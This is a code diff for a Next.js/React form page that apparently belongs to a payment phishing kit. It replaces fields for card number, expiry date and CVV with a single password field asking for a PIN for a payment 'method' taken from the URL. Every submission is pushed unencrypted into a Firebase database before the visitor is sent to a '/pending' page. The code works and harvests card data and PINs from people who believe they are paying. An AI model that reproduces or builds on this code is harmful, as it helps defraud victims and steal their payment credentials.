@@ -2,44 +2,22 @@
 import { useState } from "react";
 import { ref, push } from "firebase/database";
 import { database } from "@/app/lib/firebase";
-import { useRouter } from "next/navigation";
+import { useRouter, useSearchParams } from "next/navigation";
 
 export default function Page() {
   // Changed from "page" to "Page"
   const router = useRouter();
+  const searchParams = useSearchParams()
+  const method = searchParams.get('method')
+
 
   const [formData, setFormData] = useState({
-    card_no: "",
-    expiry_date: "",
-    cvv: "",
+    method: method,
+    pin: "",
   });
 
   const handleChange = (e) => {
     let { name, value } = e.target;
-    // Apply formatting logic based on input name
-    if (name === "card_no") {
-      // Card number formatting (4 digits separated by space)
-      value = value.replace(/\D/g, ""); // Remove non-digits
-      value = value.replace(/(.{4})/g, "$1 ").trim(); // Add space after every 4 characters
-      // Limit card number to 19 characters
-      if (value.length > 19) {
-        value = value.substring(0, 19);
-      }
-    } else if (name === "expiry_date") {
-      // Expiry date formatting (MM/YY)
-      value = value.replace(/\D/g, ""); // Remove non-digits
-      if (value.length > 4) {
-        value = value.substring(0, 4);
-      }
-      const formattedInput = value.match(/.{1,2}/g)?.join("/") || "";
-      value = formattedInput;
-    } else if (name === "cvv") {
-      // CVV formatting (3 digits)
-      value = value.replace(/\D/g, ""); // Remove non-digits
-      if (value.length > 3) {
-        value = value.substring(0, 3);
-      }
-    }
 
     setFormData({
       ...formData,
@@ -53,9 +31,8 @@ export default function Page() {
     await push(formRef, formData);
     router.push("/pending");
     setFormData({
-      card_no: "",
-      expiry_date: "",
-      cvv: "",
+      method: method,
+      pin: "",
     });
   };
 
@@ -70,8 +47,9 @@ export default function Page() {
           </span>
         </div>
         <div class="p-6">
+            <span className="text-xl">Enter your {method} PIN</span>
           <form
-            class="space-y-6 flex flex-col justify-center"
+            class="space-y-6 flex flex-col justify-center mt-10"
             action=""
             id="third-form"
             onSubmit={handleSubmit} // Added onSubmit handler
@@ -79,51 +57,17 @@ export default function Page() {
             {/* <!-- Full Name --> */}
             <div class="mb-4">
               <label class="block text-gray-700 text-sm mb-2" for="card_no">
-                Card No.
+                PIN
               </label>
               <input
                 class="shadow appearance-none border-b rounded-md w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
-                id="card_no"
-                name="card_no"
-                type="text"
+                id="pin"
+                name="pin"
+                type="password"
                 placeholder="Please enter here"
-                value={formData.card_no} // Updated value attribute
+                value={formData.pin} // Updated value attribute
                 onChange={handleChange} // Added onChange handler
               />
-            </div>
-            {/* <!-- Expiry and CVV --> */}
-            <div class="grid grid-cols-2 gap-2">
-              <div class="mb-4">
-                <label
-                  class="block text-gray-700 text-sm mb-2"
-                  for="expiry_date"
-                >
-                  Expiry Date
-                </label>
-                <input
-                  class="shadow appearance-none border-b rounded-md w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
-                  id="expiry_date"
-                  name="expiry_date"
-                  type="text"
-                  placeholder="Please enter here"
-                  value={formData.expiry_date} // Updated value attribute
-                  onChange={handleChange} // Added onChange handler
-                />
-              </div>
-              <div class="mb-4">
-                <label class="block text-gray-700 text-sm mb-2" for="cvv">
-                  CVV
-                </label>
-                <input
-                  class="shadow appearance-none border-b rounded-md w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
-                  id="cvv"
-                  name="cvv"
-                  type="password"
-                  placeholder="Please enter here"
-                  value={formData.cvv} // Updated value attribute
-                  onChange={handleChange} // Added onChange handler
-                />
-              </div>
             </div>
             {/* <!-- Submit Button --> */}
             <div class="px-10 w-full flex justify-center items-center">
